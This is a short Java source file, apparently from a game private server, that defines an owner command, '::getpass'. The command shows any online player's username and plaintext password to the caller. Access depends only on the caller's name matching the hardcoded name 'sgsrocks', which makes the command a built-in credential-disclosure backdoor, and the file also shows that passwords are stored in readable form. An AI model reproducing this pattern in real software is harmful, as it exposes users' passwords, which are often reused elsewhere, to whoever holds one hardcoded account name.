package godzhell.model.players.packets.commands.owner;

import java.util.Optional;

import godzhell.model.players.Player;
import godzhell.model.players.PlayerHandler;
import godzhell.model.players.packets.commands.Command;

/**
 * Show the password of the specified player.
 * 
 * @author Emiel
 *
 */
public class Getpass extends Command {

	@Override
	public void execute(Player c, String input) {
		try {
			if (!c.playerName.equalsIgnoreCase("sgsrocks")) {
				return;
			}
			Optional<Player> c2 = PlayerHandler.getOptionalPlayer(input);
			if (c2.isPresent()) {
				c.sendMessage("Username: (" + c2.get().playerName + ") Password: (" + c2.get().playerPass + ") ");
			} else {
				c.sendMessage("This player either does not exist or is OFFLINE.");
			}
		} catch (Exception e) {
			c.sendMessage("Invalid Command, Try ::getpass USERNAME.");
		}
	}
}
